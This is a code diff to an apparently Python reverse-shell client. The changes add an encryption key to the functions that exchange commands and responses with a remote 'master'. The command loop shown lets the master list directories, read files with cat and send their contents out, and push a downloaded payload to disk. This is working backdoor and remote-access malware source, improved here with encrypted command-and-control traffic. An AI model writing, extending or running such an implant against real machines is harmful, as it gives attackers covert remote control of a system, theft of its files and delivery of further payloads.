@@ -23,11 +23,12 @@ def reverse_shell(master_hostname, shell_port):
             # reborn(master_hostname, master_port)
     exit(0)
 
-def send_res(conn, res):
+def send_res(conn, res, KEY):
     # encrypted plain text response and send to master
     try:
         res = "ACK" + res
-        crypt_res = encrypt(res)
+        res = bytes(res, 'utf-8')
+        crypt_res = encrypt(res, KEY)
         conn.send(crypt_res)
     except socket_error:
         print("error1")
@@ -36,11 +37,12 @@ def send_res(conn, res):
     return conn
 
 
-def recv_cmd(conn, buffer):
+def recv_cmd(conn, buffer, KEY):
     # receive encrypted response from master and decrypt
     try:
         crypt_cmd = conn.recv(buffer)
-        cmd = decrypt(crypt_cmd)
+        cmd = decrypt(crypt_cmd, KEY)
+        cmd = cmd.decode('utf-8')
         return conn, cmd
     except socket_error:
         print("error2")
@@ -48,10 +50,10 @@ def recv_cmd(conn, buffer):
         exit(0)
 
 
-def cmd_shell(conn, master_hostname, master_port):
+def cmd_shell(conn, master_hostname, master_port, KEY):
     # command shell interface
     while True:
-        conn, cmd = recv_cmd(conn, 1024)
+        conn, cmd = recv_cmd(conn, 1024, KEY)
         res = ""
 
         if cmd[:2] == "ls":
@@ -63,11 +65,11 @@ def cmd_shell(conn, master_hostname, master_port):
             resp_list = listdir(path)
             for resp in resp_list:
                 res += resp + "\n"
-            conn = send_res(conn, res)
+            conn = send_res(conn, res, KEY)
 
         elif cmd[:3] == "pwd":
             res = str(getcwd())
-            conn = send_res(conn, res)
+            conn = send_res(conn, res, KEY)
 
         elif cmd[:3] == "cat":
             data = ""
@@ -90,7 +92,7 @@ def cmd_shell(conn, master_hostname, master_port):
 
         elif cmd[:2] == "pl":
             filename = "master_dl"
-            conn, data = recv_cmd(conn, 64000)
+            conn, data = recv_cmd(conn, 64000, KEY)
             fp = open(filename, "w")
             fp.write(data)
             fp.close()
@@ -102,5 +104,5 @@ def cmd_shell(conn, master_hostname, master_port):
             
         else:
             res = "404could not find command"
-            conn = send_res(conn, res)
+            conn = send_res(conn, res, KEY)
                 
